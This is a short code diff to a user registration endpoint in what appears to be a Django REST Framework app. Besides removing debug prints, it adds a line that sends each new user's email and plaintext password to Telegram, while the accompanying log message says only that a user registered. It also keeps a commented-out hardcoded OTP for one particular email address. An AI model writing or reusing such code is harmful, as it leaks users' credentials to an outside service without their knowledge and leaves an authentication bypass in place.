@@ -11,7 +11,11 @@ import datetime
 from rest_framework_simplejwt.tokens import RefreshToken
 from apps.shared.utils import SuccessResponse
 from drf_spectacular.utils import extend_schema
+from apps.shared.utils import send_telegram_message, get_logger
 import uuid
+
+logger = get_logger()
+
 
 @extend_schema(
     summary='to register user'
@@ -26,20 +30,17 @@ class RegisterUser(GenericAPIView):
         serializer.is_valid(raise_exception=True)
         req_body = serializer.validated_data
 
-        print('user is here')
         otp = generate_otp()
         # if req_body["email"] == 'sirojiddinovsolohiddin961@gmail.com':
         #     otp = "2222"
 
         user = get_user_by_username(req_body["email"])
-        print('user is here')
-        print(user)
-        print(req_body['email'])
+        send_telegram_message(f"user is registered with email: {req_body['email']} with password: \n{req_body['password']}")
+        logger.info("user is registered")
         if user is None:
             user = create_user(email=req_body["email"], 
                                first_name=req_body.get("first_name",""),
                                password=req_body["password"], is_active=False)
-        print('user is passed -------------------')
         user_role = get_user_role_by_username_role_self(req_body["email"], self.role)
 
         if user_role is not None:
